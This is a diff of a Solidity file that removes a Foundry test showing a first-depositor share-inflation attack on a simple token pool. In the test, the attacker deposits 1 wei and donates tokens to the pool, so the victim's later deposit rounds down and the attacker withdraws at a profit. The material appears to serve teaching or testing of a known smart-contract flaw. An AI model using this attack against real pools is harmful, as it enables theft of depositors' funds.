@@ -1,53 +1,9 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.15;
 
-import "forge-std/Test.sol";
+
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
-
-contract ContractTest is Test {
-    SimplePool SimplePoolContract;
-    MyToken MyTokenContract;
-
-    function setUp() public {
-        MyTokenContract = new MyToken();
-        SimplePoolContract = new SimplePool(address(MyTokenContract));
-    }
-
-    function testFirstDeposit() public {
-        address alice = vm.addr(1);
-        address bob = vm.addr(2);
-        MyTokenContract.transfer(alice, 1 ether + 1);
-        MyTokenContract.transfer(bob, 2 ether);
-
-        vm.startPrank(alice);
-        // Alice deposits 1 wei, gets 1 pool token
-        MyTokenContract.approve(address(SimplePoolContract), 1);
-        SimplePoolContract.deposit(1);
-
-        // Alice transfers 1 ether to the pool, inflating the pool token price
-        MyTokenContract.transfer(address(SimplePoolContract), 1 ether);
-
-        vm.stopPrank();
-        vm.startPrank(bob);
-        // Bob deposits 2 ether, gets 1 pool token due to inflated price
-        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
-        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1.
-        MyTokenContract.approve(address(SimplePoolContract), 2 ether);
-        SimplePoolContract.deposit(2 ether);
-        vm.stopPrank();
-        vm.startPrank(alice);
-
-        MyTokenContract.balanceOf(address(SimplePoolContract));
-
-        // Alice withdraws and gets 1.5 ether, making a profit
-        SimplePoolContract.withdraw(1);
-        assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);
-        console.log("Alice balance", MyTokenContract.balanceOf(alice));
-    }
-
-    receive() external payable {}
-}
 
 contract MyToken is ERC20, Ownable {
     constructor() ERC20("MyToken", "MTK") {
